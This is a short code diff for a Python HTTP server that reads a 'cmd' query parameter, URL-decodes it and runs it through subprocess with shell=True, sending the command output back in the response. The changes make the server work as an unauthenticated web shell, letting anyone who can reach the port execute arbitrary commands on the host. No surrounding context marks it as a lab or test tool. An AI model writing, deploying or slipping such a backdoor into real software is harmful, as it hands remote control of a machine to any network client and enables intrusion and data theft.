@@ -10,15 +10,16 @@ class S(SimpleHTTPRequestHandler):
         out = ""
         if query:
             print(f"Query: {query}")
-            cmd = query.split("cmd=")[1].split("&")[0]
+            cmd = urllib.parse.unquote(query.split("cmd=")[1].split("&")[0])
             print(f"cmd: {cmd}")
 
             try:
-                out = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
+                out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
                 print(f"out: {out}")
             except Exception as e:
                 out=str(e)
         
+        out = str(out)
         self.send_response(200)
         self.end_headers()
         self.wfile.write(bytes(out, encoding='utf-8'))
@@ -35,6 +36,8 @@ def run(server_class=HTTPServer, handler_class=S, port=8080):
 
 if __name__ == '__main__':
     from sys import argv
+
+    print("Running...")
 
     if len(argv) == 2:
         run(port=int(argv[1]))
